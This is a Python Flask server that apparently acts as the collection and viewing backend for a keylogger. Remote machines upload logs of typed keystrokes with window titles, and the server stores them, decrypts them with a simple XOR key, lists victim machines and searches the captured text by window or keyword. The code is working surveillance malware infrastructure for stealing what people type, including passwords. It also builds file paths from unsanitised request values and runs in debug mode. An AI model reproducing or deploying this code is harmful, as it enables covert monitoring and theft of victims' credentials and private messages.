import json
import os
from datetime import datetime
from flask import Flask, request, jsonify, render_template

app = Flask(__name__, template_folder="templates")

LOGS_DIR = "data"
os.makedirs(LOGS_DIR, exist_ok=True)


# 🔐 XOR Decryption Function (User Provides Key)
def xor_decrypt(data, key):
    """Decrypts a string using XOR with a user-supplied key."""
    return "".join(chr(int(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data.split("-")))


def decrypt_logs(logs, key):
    """Helper function to decrypt all keystrokes using the provided key."""
    decrypted = {}
    for timestamp, windows in logs.items():
        decrypted_timestamp = xor_decrypt(timestamp, key)
        decrypted[decrypted_timestamp] = {}
        for window, encrypted_keys in windows.items():
            decrypted_window = xor_decrypt(window, key)
            try:
                decrypted_keys = xor_decrypt(encrypted_keys, key)
                decrypted[decrypted_timestamp][decrypted_window] = decrypted_keys
            except Exception:
                decrypted[decrypted_timestamp][decrypted_window] = "[Decryption Error]"
    return decrypted


@app.route("/")
def index():
    return render_template("index.html")


@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.json
    machine_name = data.get("machine")
    log = data.get("data")

    if not machine_name or not log:
        return jsonify({"error": "Invalid Data"}), 400

    machine_dir = os.path.join(LOGS_DIR, machine_name)
    os.makedirs(machine_dir, exist_ok=True)

    log_file = os.path.join(machine_dir, f"{datetime.now().strftime('%Y-%m-%d')}.json")

    if not os.path.exists(log_file):
        with open(log_file, "w", encoding="utf-8") as file:
            json.dump({}, file)

    with open(log_file, "r", encoding="utf-8") as file:
        logs = json.load(file)
    logs.update(log)

    with open(log_file, "w", encoding="utf-8") as file:
        json.dump(logs, file, indent=4, ensure_ascii=False)

    return jsonify({"message": "Log received"}), 200


@app.route('/api/machines', methods=['GET'])
def list_machines():
    if not os.path.exists(LOGS_DIR):
        return jsonify({"machines": []})

    machines = [
        d for d in os.listdir(LOGS_DIR)
        if os.path.isdir(os.path.join(LOGS_DIR, d))
    ]

    return jsonify({"machines": machines}), 200


@app.route('/api/get_keystrokes', methods=['GET'])
def get_key_strokes_by_machine():
    """
    Retrieves keystroke logs for a specific machine, decrypts them using the provided key,
    and applies optional filters (date, window, search text).
    """
    machine_name = request.args.get("machine")
    user_key = request.args.get("key")  # User-provided decryption key
    date = request.args.get("date")
    window_name = request.args.get("window")
    search_text = request.args.get("searchText")

    if not machine_name:
        return jsonify({"error": "Missing 'machine' query parameter."}), 400
    if not user_key:
        return jsonify({"error": "Missing 'key' query parameter for decryption."}), 400

    machine_dir = os.path.join(LOGS_DIR, machine_name)
    if not os.path.exists(machine_dir):
        return jsonify({"error": f"Machine {machine_name} not found"}), 404

    decrypted_logs = {}

    # Load logs from a specific date or all logs
    if date:
        log_file = os.path.join(machine_dir, f"{date}.json")
        if os.path.exists(log_file):
            with open(log_file, "r", encoding="utf-8") as file:
                decrypted_logs = decrypt_logs(json.load(file), user_key)
    else:
        for log_file in os.listdir(machine_dir):
            if log_file.endswith(".json"):
                with open(os.path.join(machine_dir, log_file), "r", encoding="utf-8") as file:
                    decrypted_logs.update(decrypt_logs(json.load(file), user_key))

    # Apply filters (window name and search text)
    if window_name:
        decrypted_logs = {
            timestamp: {win: keys for win, keys in windows.items() if window_name.lower() in win.lower()}
            for timestamp, windows in decrypted_logs.items()
        }

    if search_text:
        decrypted_logs = {
            timestamp: {win: keys for win, keys in windows.items() if search_text.lower() in keys.lower()}
            for timestamp, windows in decrypted_logs.items()
        }

    return jsonify({"machine": machine_name, "logs": decrypted_logs}), 200


if __name__ == "__main__":
    app.run(debug=True)
